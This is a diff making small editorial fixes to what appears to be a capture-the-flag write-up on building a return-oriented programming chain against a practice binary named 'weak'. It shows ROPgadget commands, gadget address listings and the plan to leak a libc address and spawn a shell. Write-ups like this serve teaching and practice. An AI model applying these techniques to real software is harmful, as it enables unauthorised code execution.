@@ -40,7 +40,7 @@ So what i did now was start to find some gadgets.
 $ ROPgadget --binary ./weak --depth 50
 ```
 What i want to do for this was make a leak, restart execution and then jump to libc address to gain a shell.
-###The problem
+### The problem
 As we can see from the dump there are NOT simple gadget like 'pop rdi' to control registers.
 ```
 $ ROPgadget --binary ./weak --depth 40 |grep pop|grep ret
@@ -79,7 +79,7 @@ $ ROPgadget --binary ./weak --depth 40 |grep pop|grep ret
 0x000000000040050d : syscall ; and byte ptr [rax], al ; cmp rax, rbx ; jb 0x40050e ; mov byte ptr [rip + 0x2004fb], 1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
 ```
 Then i start to search for more complicated gadgets to chain in order to gain control over rdi register.
-The first gadget that i pick was this one:
+The first gadget that i picked was this one:
 ```
 0x0000000000400637 : mov ebx, dword ptr [rsp + 8] ; mov rbp, qword ptr [rsp + 0x10] ; mov r12, qword ptr [rsp + 0x18] ; mov r13, qword ptr [rsp + 0x20] ; mov r14, qword ptr [rsp + 0x28] ; mov r15, qword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
 ```
